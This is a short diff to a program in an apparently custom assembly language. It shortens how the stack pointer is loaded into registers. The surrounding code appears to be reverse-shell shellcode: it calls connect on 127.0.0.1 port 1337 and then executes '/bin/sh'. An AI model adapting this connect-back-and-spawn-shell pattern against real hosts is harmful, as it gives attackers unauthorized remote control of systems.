@@ -24,13 +24,7 @@ main:
     ESET    SRAX    0x2a   # 42 sys_connect
     
     # Get pointer to stack for sa_addr struct
-    CLR
-    EGET    SRSP
-    MREG    
-    BASE
-    ADD
-    SWAP    # VAL = &Stack 
-    ESET    SRSI
+    ESET    SRSI    SRSP
 
     # sa_addr struct as layed out in C program
     # EPUSH   0x020005397f000001
@@ -65,12 +59,7 @@ main:
     ESET    SRDX    0x0
 
     CLR
-    EGET    SRSP
-    MREG    
-    BASE
-    ADD
-    SWAP    # VAL = &Stack 
-    ESET    SRDI
+    ESET    SRDI    SRSP
     EPUSH   "/bin/sh"
     SYSCALL
     POP
